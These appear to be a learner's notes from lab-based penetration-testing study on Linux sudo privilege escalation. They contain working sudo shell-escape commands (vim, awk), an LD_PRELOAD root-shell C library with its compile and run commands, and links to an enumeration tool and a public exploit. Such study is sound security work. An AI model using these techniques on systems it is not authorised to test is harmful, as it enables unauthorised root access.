# Introduction
**Escalation Path – Sudo**: A privilege escalation technique in which an attacker exploits misconfigured `sudo` permissions, overly permissive command rules, or vulnerable programs executable with elevated privileges to execute commands as another user, typically `root`, and gain higher-level access to a Linux system.

# Escalation via Sudo Shell Escaping
**Escalation via Sudo Shell Escaping :**
A Linux privilege escalation technique that abuses permitted commands configured in the `sudoers` file to execute an interactive shell with elevated privileges. If a user can run a program as root through `sudo` and that program supports shell escapes, they may break out into a root shell. This effectively bypasses the intended command restrictions and grants root-level access. Common examples include `vim`, `less`, `find`, and `awk`.

Resources :
1. GTFOBins : https://gtfobins.org/

Following Commands:
```bash
sudo -l
# lists all sudo commands that can run without password

## REFERED GTFOBins.....
# In the machine we found vim works with no passwd. So, (example)
sudo vim -c ':!/bin/sh'
or
sudo vim -c ':!/bin/bash'
# this gives a shell, and that happens to be root shell

# In the machine we found awk works with no passwd. So, (example)
awk 'BEGIN {system("/bin/sh")}'
# this gives a shell, and that happens to be root shell

```
# Escalation via Intended Functionality
**Escalation via Intended Functionality :**
A Linux privilege escalation technique that abuses legitimate features of an application or binary executed with elevated privileges. Instead of exploiting a software vulnerability, the attacker misuses functionality such as file writing, command execution, file reading, or permission modification to gain higher privileges. For example, abusing a root-executed text editor to modify `/etc/passwd` or execute privileged commands. The technique relies on the application's available functionality and execution context.

Resources :
1.  Any of the `hack the box sunday walkthough` blogs
	- Escalation via the functionality of `wget`

# Escalation via LD_PRELOAD
**Escalation via LD_PRELOAD :**
A Linux privilege escalation technique that abuses the `LD_PRELOAD` environment variable to load a custom shared library before other libraries when a program executes. An attacker can create a malicious shared library containing code that executes with the privileges of the target process. If a privileged executable permits `LD_PRELOAD` to be used, this can result in arbitrary code execution with elevated privileges. However, secure-execution mechanisms (such as those applied to SUID binaries) typically restrict or ignore `LD_PRELOAD`.

Resources :
shell.c snippet -
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

```

Following Commands :
```bash
sudo -l
# cmd_output:
# Matching Defaults entries for TCM on this host:
    # env_reset, env_keep+=LD_PRELOAD

nano shell.c

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/path/to/shell.so apache2
# Gives the Root shell
```

# Sudo PrivEsc Challenge

Resources :
1. dirsearch - [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
2. Exploit-DB for Simple CMS - [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635)
